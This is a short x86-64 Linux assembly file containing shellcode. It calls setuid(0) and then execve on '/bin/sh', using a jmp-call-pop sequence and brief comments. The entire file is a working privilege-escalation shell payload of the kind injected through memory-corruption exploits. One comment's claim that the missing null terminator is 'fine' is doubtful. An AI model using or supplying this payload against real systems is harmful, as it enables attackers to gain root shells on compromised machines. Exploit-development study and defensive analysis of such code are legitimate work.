global _start

section .text

_start:
	push 0x69
	pop  rax
	xor  rdi, rdi
	syscall

	push 0x3b
	pop  rax
	jmp  binsh

back:
	pop rdi; pop the address of "/bin/sh" in rdi
	xor rsi, rsi
	xor rdx, rdx
	syscall

binsh:
	call back; call pushes the address of next instruction (or data) to the stack
	db   "/bin/sh"; null byte at end is fine
